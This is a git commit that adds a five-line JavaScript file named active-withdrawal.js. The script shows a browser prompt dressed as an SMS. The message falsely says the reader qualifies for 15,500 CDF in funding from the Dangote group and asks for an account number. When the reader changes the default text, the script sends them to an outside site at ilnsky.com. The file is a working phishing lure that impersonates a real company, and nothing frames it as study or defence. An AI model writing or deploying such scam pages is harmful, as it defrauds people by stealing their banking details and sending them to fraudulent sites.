b77a45d7deb5433f110d8d0e519659769796132e
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-11 08:01:33 +0100

    Create active-withdrawal.js

---
+++ active-withdrawal.js
@@ -0,0 +1,5 @@
+var password = 'RETRAIT DE 15 500 CDF'
+password=prompt('SMS: Félicitations, vous êtes éligible à recevoir un financement de 15 500 CDF du groupe Dangote. Cliquez sur OK pour saisir votre numéro de compte.','RETRAIT DE 15 500 CDF');
+if (password != 'RETRAIT DE 15 500 CDF') {
+location.href='https://ilnsky.com/birthday-dangote';
+}
